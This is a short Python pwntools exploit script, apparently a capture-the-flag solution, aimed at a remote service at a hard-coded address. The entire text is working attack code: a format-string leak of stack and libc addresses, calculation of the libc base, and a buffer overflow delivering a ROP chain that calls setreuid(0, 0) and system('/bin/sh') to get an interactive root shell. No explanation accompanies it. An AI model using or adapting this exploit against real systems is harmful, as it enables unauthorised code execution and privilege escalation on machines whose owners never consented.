from pwn import *

context.arch="amd64"

p = connect("52.59.124.14", 5020)
p.recvuntil(b">> ")
p.sendline(b"yay")

p.recvuntil(b">> ")
p.sendline(b"%146$p%151$p")

p.recvuntil(b"email provided: ")

a = p.recvuntil(b"\n")

rbp = int(a[0:14],16)
libc_addr = int(a[14:-1], 16)
print("rbp: " + hex(rbp) + "\nlibc_addr: " + hex(libc_addr))

libc = ELF("./libc.so.6")
libc.address = libc_addr - 0x2724A

libc_rop = ROP(libc)

bin_sh = next(libc.search(b'/bin/sh'))
libc_rop.setreuid(0, 0)

libc_rop.system(bin_sh)

#system_addr = libc.symbols['system']

exp = b"A"*0x3f8+libc_rop.chain()

p.send(exp)
p.interactive()


